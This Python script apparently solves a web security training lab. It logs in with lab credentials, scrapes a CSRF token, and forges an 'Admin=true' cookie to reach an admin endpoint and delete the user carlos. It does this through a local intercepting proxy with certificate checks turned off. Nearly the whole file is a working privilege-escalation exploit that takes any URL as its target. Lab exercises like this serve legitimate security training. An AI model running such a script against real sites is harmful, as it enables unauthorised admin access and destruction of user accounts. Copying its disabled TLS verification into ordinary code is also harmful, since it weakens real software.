import requests
import sys
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def deleteUsr(url,s):
    csrfUrl = url + '/login'
    req = s.get(csrfUrl , verify=False , proxies=proxies)
    ## get the csrf token and session
    soup = BeautifulSoup(req.text, 'html.parser')
    csrf = soup.find("input", {'name': 'csrf'})['value']
    ## go now for login and check admin parameter
    data = {
        'csrf': csrf,
        'username': 'wiener',
        'password': 'peter',
        }
    req = s.post(csrfUrl, verify=False , proxies=proxies,data=data)
    res = req.text
    if "Log out" in res:
        print("(+) Successfully Logged in!")
        print("(+) Trying to change the value of Admin parameter...")
        myAccountUrl = url + '/my-account'
        req = s.get(myAccountUrl, verify=False , proxies=proxies)
        session_cookies = req.cookies.get_dict().get('session')
        cookies = {'session' : session_cookies, 'Admin' : 'true'}
        deleteCarlosUrl = url + '/admin/delete?username=carlos';
        req = s.get(deleteCarlosUrl, verify=False , proxies=proxies, cookies=cookies)
        if req.status_code == 200:
            print("(+) Successfully got admin control")
            print("(+) Successfully deleted carlos user")
        else:
            print("(+) Cannot get admin control by channging the cookies value")
    else:
        print("(+) Cannot log in !")


def main():
    if(len(sys.argv) != 2):
        print ("Usage: %s URL " % sys.argv[0].split("/")[0])
        print ("Example: %s www.example.com" % sys.argv[0].split("/")[0])
        sys.exit(-1)
    print("(+) Finding admin panel...")
    url = sys.argv[1]
    s = requests.Session()
    deleteUsr(url,s) 

if __name__ == '__main__':
    main()